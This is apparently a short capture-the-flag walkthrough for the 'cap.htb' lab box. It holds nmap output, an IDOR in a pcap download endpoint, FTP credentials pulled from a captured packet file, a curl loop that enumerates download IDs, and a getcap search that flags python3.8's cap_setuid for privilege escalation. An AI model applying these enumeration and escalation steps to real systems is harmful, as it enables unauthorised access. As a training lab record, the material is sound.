# #pcap #capability #IDOR

# NMAP


```shell 
Host is up (0.080s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sat, 24 Aug 2024 04:44:07 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server.
```



> the site has a functionality that captures network packets, has an IDOR vulnerability that lets me get a packet captured from another user 
```
cap.htb/download/0
```

> search through the pcap file and I found an FTP login 
```
Credentials
username: nathan
password: Buck3tH4TF0RM3!
```

> Created a script that would go through different id's to get pcap files
``` bash
#!/bin/zsh

range=$1
for i in {0..$range} 
	do 
			req=$( curl -s http://cap.htb/download/$i --head ) ;
			if [[ $req != *"404"* ]];
			then echo $i;
			fi
	done
```

> python3.8 has a ==cap_setuid== capability on which can escalate privileges
> executed this command to get all capabilities 


`getcap -r / 2>/dev/null`

```shell
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

```